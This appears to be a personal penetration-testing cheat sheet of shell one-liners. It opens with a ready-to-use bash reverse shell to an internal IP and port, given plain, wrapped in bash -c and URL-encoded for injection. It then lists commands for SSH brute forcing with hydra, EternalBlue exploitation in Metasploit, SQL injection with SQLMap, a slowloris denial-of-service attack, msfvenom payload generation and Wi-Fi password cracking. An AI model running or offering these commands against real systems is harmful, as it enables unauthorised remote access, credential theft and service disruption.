#Reverse Shell
bash -i >& /dev/tcp/192.168.119.3/4444 0>&1

    #Executed AS BASH
    bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"

    #Encoded
    bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22

# Timer
clear && while true; do echo -ne "$(date)\r"; sleep 1; done

# Scan for open ports on a target system using Nmap
nmap -p- -T4 target_ip

# Enumerate open ports and services using Nmap
nmap -sV -sC target_ip

# Perform a directory and file enumeration with gobuster
gobuster dir -u http://target_url -w /path/to/wordlist

# Brute force SSH login with hydra
hydra -l username -P /path/to/password_list ssh://target_ip

# Check for common web vulnerabilities with Nikto
nikto -h http://target_url

# Enumerate subdomains with Sublist3r
python sublist3r.py -d target_domain

# Perform a banner-grabbing and service enumeration using Netcat
nc -v -n -z -w1 target_ip port_range

# Exploit a known vulnerability in a web application using Metasploit
msfconsole
use exploit_path
set RHOSTS target_ip
exploit

# Crack password hashes using John the Ripper
john --format=hash_type hash_file

# Check for open SMB shares with smbclient
smbclient -L //target_ip

# Enumerate SMB shares and access them with smbclient
smbclient //target_ip/share_name

# Exploit a known SMB vulnerability with EternalBlue
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target_ip
exploit

# Conduct a DNS enumeration with dig
dig axfr @target_ip target_domain

# Perform a DNS zone transfer with nslookup
nslookup
set type=any
ls -d target_domain

# Test SSL/TLS security with SSLyze
sslyze --regular target_domain:port

# Exploit a known Linux privilege escalation vulnerability (e.g., DirtyCow)
searchsploit dirtycow

# Extract sensitive information from a pcap file with tshark
tshark -r capture.pcap -Y "http.request.method == POST"

# Check for open SNMP ports and enumerate SNMP data
snmp-check -t target_ip -c public

# Cracking Wi-Fi WPA/WPA2 PSK passwords with Aircrack-ng
aircrack-ng -w wordlist.txt -b BSSID capture.cap

# Perform a basic network scan with Scapy
scapy
sr1(IP(dst="target_ip")/ICMP())

# Retrieve email addresses and URLs from a webpage using theHarvester
theHarvester -d target_domain -b all

# Perform a basic network scan with Masscan
masscan -p1-65535 --rate=1000 target_ip

# Check for open DNS resolvers with dnsrecon
dnsrecon -d target_domain

# Extract metadata from files with exiftool
exiftool file_name

# Test cross-site scripting (XSS) vulnerabilities using XSStrike
python xsstrike.py -u http://target_url

# Test SQL injection vulnerabilities using SQLMap
sqlmap -u "http://target_url/?parameter=value" --dbs

# Perform an HTTP request smuggling attack using Smuggler
python smuggler.py -u "http://target_url" -r /path/to/request.txt

# Check for open SMB shares with enum4linux
enum4linux target_ip

# Perform brute-force attacks against SNMP community strings using onesixtyone
onesixtyone -c community_file -i target_ip

# Enumerate DNS information using dnsenum
dnsenum target_domain

# Test for open ports and services with Unicornscan
unicornscan target_ip

# Exploit common web application vulnerabilities with w3af
w3af_console

# Perform a slowloris DoS attack against a target web server
slowloris -p target_ip

# Generate a payload with msfvenom
msfvenom -p payload_type LHOST=attacker_ip LPORT=attacker_port -f format -o output_file

# Perform network discovery and enumeration with netdiscover
netdiscover -r target_ip_range

# Scan for open FTP ports with nmap
nmap -p 21 target_ip

# Enumerate FTP shares with nmap
nmap --script ftp-anon target_ip

# Exploit known vulnerabilities with searchsploit
searchsploit vulnerability_name

# Check for exposed sensitive information with Shodan
shodan search query

# Extract email addresses from files with grep
grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,7}\b" file.txt

# Check for open MySQL ports with nmap
nmap -p 3306 target_ip

# Enumerate MySQL databases with nmap
nmap --script mysql-enum target_ip

# Test for open RDP ports with nmap
nmap -p 3389 target_ip

# Enumerate RDP services with nmap
nmap --script rdp-enum target_ip